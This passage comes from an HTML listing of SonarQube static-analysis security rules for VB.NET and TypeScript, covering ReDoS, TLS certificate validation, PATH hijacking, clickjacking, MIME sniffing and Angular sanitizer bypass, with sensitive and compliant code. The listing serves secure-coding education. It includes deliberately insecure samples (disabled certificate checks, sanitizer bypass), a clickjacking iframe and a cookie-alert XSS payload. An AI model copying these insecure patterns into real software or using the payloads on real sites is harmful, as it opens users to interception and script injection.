<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S6444">
              vbnet:S6444
            </a>
          </td>
          <td>
            <details>
              <p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using
<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts
excessively long.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the input passed to the regular expression is untrusted. </li><li> the regular expression contains patterns vulnerable to <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">catastrophic
  backtracking</a>. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to specify a <a href="https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values" rel="nofollow"><code>matchTimeout</code></a> when executing a
  regular expression. </li><li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li><li> Consider using a non-backtracking algorithm by specifying <a href="https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view&#61;net-7.0" rel="nofollow"><code>RegexOptions.NonBacktracking</code></a>. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Sub RegexPattern(Input As String)
    Dim EmailPattern As New Regex(&#34;.&#43;&#64;.&#43;&#34;, RegexOptions.None)
    Dim IsNumber as Boolean &#61; Regex.IsMatch(Input, &#34;[0-9]&#43;&#34;)
    Dim IsLetterA as Boolean &#61; Regex.IsMatch(Input, &#34;(a&#43;)&#43;&#34;)
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub RegexPattern(Input As String)
    Dim EmailPattern As New Regex(&#34;.&#43;&#64;.&#43;&#34;, RegexOptions.None, TimeSpan.FromMilliseconds(100))
    Dim IsNumber as Boolean &#61; Regex.IsMatch(Input, &#34;[0-9]&#43;&#34;, RegexOptions.None, TimeSpan.FromMilliseconds(100))
    Dim IsLetterA As Boolean &#61; Regex.IsMatch(Input, &#34;(a&#43;)&#43;&#34;, RegexOptions.NonBacktracking) &#39;.Net 7 And above
    AppDomain.CurrentDomain.SetData(&#34;REGEX_DEFAULT_MATCH_TIMEOUT&#34;, TimeSpan.FromMilliseconds(100)) &#39;process-wide setting
End Sub
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - Regular expression Denial of
  Service - ReDoS </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/best-practices" rel="nofollow">docs.microsoft.com</a> - Best practices for regular expressions
  in .NET </li><li> <a href="https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions" rel="nofollow">docs.microsoft.com</a> - Backtracking in
  Regular Expressions </li><li> <a href="https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking" rel="nofollow">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li><li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout" rel="nofollow">docs.microsoft.com</a> - Regex.MatchTimeout
  Property </li><li> <a href="https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view&#61;net-7.0" rel="nofollow">docs.microsoft.com</a> - RegexOptions
  Enum (NonBacktracking option) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4829">
              vbnet:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports System
Public Class C
    Public Sub Main()
        Dim x &#61; Console.[In] &#39; Sensitive
        Console.Read() &#39; Sensitive
        Console.ReadKey() &#39; Sensitive
        Console.ReadLine() &#39; Sensitive
        Console.OpenStandardInput() &#39; Sensitive
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
Imports System

Public Class C
    Public Sub Main()
        Console.ReadKey() &#39; Return value is ignored
        Console.ReadLine() &#39; Return value is ignored
    End Sub
End Class
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4823">
              vbnet:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
Module Program
    Sub Main(args As String()) &#39; Sensitive as there is a reference to &#34;args&#34; in the procedure.
        Console.WriteLine(args(0))
    End Sub
End Module
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4830">
              vbnet:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>
<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
Imports System.Net

Public Sub Send()
    ServicePointManager.ServerCertificateValidationCallback &#61;
        Function(sender, certificate, chain, errors) True &#39; Noncompliant

    Dim request As System.Net.HttpWebRequest &#61; System.Net.HttpWebRequest.Create(New System.Uri(&#34;https://example.com&#34;))
    request.Method &#61; System.Net.WebRequestMethods.Http.Get
    Dim response As System.Net.HttpWebResponse &#61; request.GetResponse()
    response.Close()
End Sub
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4036">
              vbnet:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The directories in the PATH environment variable may be defined by not trusted entities. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
Dim p As New Process()
p.StartInfo.FileName &#61; &#34;binary&#34; &#39; Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim p As New Process()
p.StartInfo.FileName &#61; &#34;C:\Apps\binary.exe&#34; &#39; Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/426" rel="nofollow">MITRE, CWE-426</a> - Untrusted Search Path </li><li> <a href="https://cwe.mitre.org/data/definitions/427" rel="nofollow">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4834">
              vbnet:S4834
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>The access control of an application must be properly implemented in order to restrict access to resources to authorized entities otherwise this
could lead to vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12999" rel="nofollow">CVE-2018-12999</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-10285" rel="nofollow">CVE-2018-10285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7455" rel="nofollow">CVE-2017-7455</a> </li></ul>
<p>Granting correct permissions to users, applications, groups or roles and defining required permissions that allow access to a resource is
sensitive, must therefore be done with care. For instance, it is obvious that only users with administrator privilege should be authorized to
add/remove the administrator permission of another user.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li><li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval
  …​). </li><li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>At minimum, an access control system should:</p>
<ul><li> Use a well-defined access control model like <a href="https://en.wikipedia.org/wiki/Role-based_access_control" rel="nofollow">RBAC</a> or <a href="https://en.wikipedia.org/wiki/Access-control_list" rel="nofollow">ACL</a>. </li><li> Entities&#39; permissions should be reviewed regularly to remove permissions that are no longer needed. </li><li> Respect <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a> (&#34;<em>an entity has access
  only the information and resources that are necessary for its legitimate purpose</em>&#34;). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Imports System.Threading
Imports System.Security.Permissions
Imports System.Security.Principal
Imports System.IdentityModel.Tokens

Class SecurityPrincipalDemo
    Class MyIdentity
        Implements IIdentity &#39; Sensitive, custom IIdentity implementations should be reviewed
    End Class

    Class MyPrincipal
        Implements IPrincipal &#39; Sensitive, custom IPrincipal implementations should be reviewed
    End Class

    &lt;System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role:&#61;&#34;Administrators&#34;)&gt; &#39; Sensitive. The access restrictions enforced by this attribute should be reviewed.
    Private Shared Sub CheckAdministrator()
        Dim MyIdentity As WindowsIdentity &#61; WindowsIdentity.GetCurrent() &#39; Sensitive

        HttpContext.User &#61; ... &#39; Sensitive: review all reference (set and get) to System.Web HttpContext.User

        Dim domain As AppDomain &#61; AppDomain.CurrentDomain
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal) &#39; Sensitive

        Dim identity As MyIdentity &#61; New MyIdentity() &#39; Sensitive
        Dim MyPrincipal As MyPrincipal &#61; New MyPrincipal(MyIdentity) &#39; Sensitive
        Thread.CurrentPrincipal &#61; MyPrincipal &#39; Sensitive
        domain.SetThreadPrincipal(MyPrincipal) &#39; Sensitive

        Dim principalPerm As PrincipalPermission &#61; New PrincipalPermission(Nothing, &#34;Administrators&#34;)  &#39; Sensitive
        principalPerm.Demand()

        Dim handler As SecurityTokenHandler &#61; ...
        Dim identities As ReadOnlyCollection(Of ClaimsIdentity) &#61; handler.ValidateToken()  &#39; Sensitive, this creates identity
    End Sub

    &#39; Sensitive: review how this function uses the identity and principal.
    Private Sub modifyPrincipal(ByVal identity As MyIdentity, ByVal principal As MyPrincipal)
    End Sub
End Class
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://cwe.mitre.org/data/definitions/276" rel="nofollow">MITRE, CWE-276</a> - Incorrect Default Permissions </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://cwe.mitre.org/data/definitions/277" rel="nofollow">MITRE, CWE-277</a> - Insecure Inherited Permissions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5732">
              typescript:S5732
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/Clickjacking" rel="nofollow">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain
buttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>
<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to
change the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed
on the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below
embedded code added on a malicious website:</p>
<pre>
&lt;html&gt;
&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;
&lt;br&gt;
&lt;iframe src&#61;&#34;https://socialnetworkexample.com/makemyprofilpublic&#34; width&#61;&#34;200&#34; height&#61;&#34;200&#34;&gt;&lt;/iframe&gt;
&lt;/html&gt;
</pre>
<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the
<em>makemyprofilpublic</em> page.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> <a href="https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories" rel="nofollow">Critical actions</a> of the application are prone to clickjacking
  attacks because a simple click on a link or a button can trigger them. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of
frame allowed to be loaded by the browser (this directive deprecates <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" rel="nofollow">X-Frame-Options</a>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if
<code>frameAncestors</code> is set to <code>&#39;none&#39;</code>):</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: [&#34;&#39;none&#39;&#34;] // Sensitive: frameAncestors  is set to none
    }
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: [&#34;&#39;example.com&#39;&#34;] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheets</a> - Clickjacking Defense
  Cheat Sheet </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors" rel="nofollow">developer.mozilla.org</a> -
  Frame-ancestors </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li><li> <a href="https://cwe.mitre.org/data/definitions/451" rel="nofollow">MITRE, CWE-451</a> - User Interface (UI) Misrepresentation of Critical Information </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5734">
              typescript:S5734
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/" rel="nofollow">MIME confusion</a> attacks occur when an
attacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource
(script, image, stylesheet …​) web browsers look for the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" rel="nofollow">Content-Type
header</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid
content-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content
of the resources (the first bytes). This &#34;guess mechanism&#34; is called <a href="https://en.wikipedia.org/wiki/Content_sniffing" rel="nofollow">MIME type
sniffing</a>.</p>
<p>Attackers can take advantage of this feature when a website (&#34;example.com&#34; here) allows to upload arbitrary files. In that case, an attacker can
upload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a href="https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots" rel="nofollow">a polyglot content</a> file) such as:</p>
<pre>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</pre>
<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers
performing MIME type sniffing.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" rel="nofollow">Content-Type</a> header is not systematically set for all
  resources. </li><li> Content of resources can be controlled by users. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" rel="nofollow">X-Content-Type-Options</a> header with
<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing
MIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object
context, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if, when using <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a>, the <code>noSniff</code>
middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet({
    noSniff: false, // Sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by
default):</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet&#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.noSniff());
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" rel="nofollow">developer.mozilla.org</a> - X-Content-Type-Options
  </li><li> <a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/" rel="nofollow">blog.mozilla.org</a> - Mitigating MIME
  Confusion Attacks in Firefox </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6268">
              typescript:S6268
            </a>
          </td>
          <td>
            <details>
              <p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework
before they are inserted into the DOM.</p>
<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting
malicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive
information or impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The value for which sanitization has been disabled is user-controlled. </li><li> It’s difficult to understand how this value is constructed. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to
  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li><li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li><li> Make sure to choose the correct <a href="https://angular.io/api/platform-browser/DomSanitizer" rel="nofollow">DomSanitizer</a> &#34;bypass&#34; method based on the
  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import { Component, OnInit } from &#39;&#64;angular/core&#39;;
import { DomSanitizer, SafeHtml } from &#34;&#64;angular/platform-browser&#34;;
import { ActivatedRoute } from &#39;&#64;angular/router&#39;;

&#64;Component({
  template: &#39;&lt;div id&#61;&#34;hello&#34; [innerHTML]&#61;&#34;hello&#34;&gt;&lt;/div&gt;&#39;
})
export class HelloComponent implements OnInit {
  hello: SafeHtml;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    let name &#61; this.route.snapshot.queryParams.name;
    let html &#61; &#34;&lt;h1&gt;Hello &#34; &#43; name &#43; &#34;&lt;/h1&gt;&#34;;
    this.hello &#61; this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import { Component, OnInit } from &#39;&#64;angular/core&#39;;
